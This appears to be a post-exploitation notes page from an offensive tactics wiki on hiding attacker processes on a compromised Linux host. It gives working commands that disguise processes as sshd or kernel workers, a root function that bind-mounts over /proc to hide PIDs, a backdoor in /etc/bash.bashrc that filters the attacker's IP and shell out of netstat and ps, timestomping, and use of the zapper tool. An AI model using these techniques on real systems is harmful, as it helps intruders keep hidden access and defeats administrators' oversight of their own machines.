# Living off the Land

## 01 - Hidden Process

> [!INFO]
> This does not hide the command line arguments.

```
$ (exec -a syslogd <commands>)
```

Spawn a hidden background process as a SSH daemon.

```
$ (exec -a '/usr/bin/sshd' <commands> &)
```

Hide process as `root`.

> [!NOTE] Elevated Privileges is required
> This script requires administrative rights and is an old Linux trick by over-mounting `/proc/<pid>` with a useless directory.

```bash
hide() {
    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
    _pid=${1:-$$}
    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
    local _argstr
    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}
```

Hides the current shell's process identifier.

```
$ hide
```

Hides a specific process identifier.

```
$ hide <pid>
```

Hides executed commands and arguments.

```
$ hide <commands>
```

Hides executed commands in a forked background process.

```
$ hide nohup <commands> &>/dev/null &
```

Creating a shell function in the resource files (`~/.bashrc`, `~/.zshrc`) to make the process hidden.

```
$ echo -e 'netstat(){ command netstat "$@" | grep -Fv -e :<attacker_PORT> -e <attacker_IP>; } ps(){ command ps "$@" | exec -a GREP grep -Fv -e /bin/bash -e GREP; }' > /usr/bin/prng \ &&
echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \ &&
touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc
```

## 02 - Hidden Commands

Download pre-compiled binary.

```
$ curl -fL -o zapper https://github.com/hackerschoice/zapper/releases/latest/download/zapper-linux-$(uname -m)

$ wget --no-hsts -qO zapper https://github.com/hackerschoice/zapper/releases/latest/download/zapper-linux-$(uname -m)

$ chmod 755 zapper
```

Execute commands but zap all options and show it as `klog` in the process list.

```
$ ./zapper -a klog <commands>
```

Started as a daemon and sshd-style name.

```
$ (./zapper -a 'sshd: root@pts/0' <commands> &)
```

## 03 - Multiplexer

### 3.1 - GNU Screen

Use the multiplexer to execute commands then attach the session name.

```
$ screen -dmS <session_name> <commands>

$ screen -x <session_name>
```

### 3.2 - Tmux

Use the multiplexer to execute commands then attach the session name.

```
$ tmux
```

Replace the existing shell with `tmux` (with `exec`). Then start and hide `tmux` and all further processes - as some kernel process.

```
$ exec ./zapper -f -a'[kworker/1:0-rcu_gp]' tmux
```

## 04 - Terminating Process

Terminate process with an identifier.

```
$ kill -9 <pid>
```

Terminate process with a string.

```
$ pkill -9 <program>
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Linux/Host/0xI - Processes and Services/List Processes/Manual/Living off the Land]]

### Github

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

- [hackerschoice: zapper](https://github.com/hackerschoice/zapper)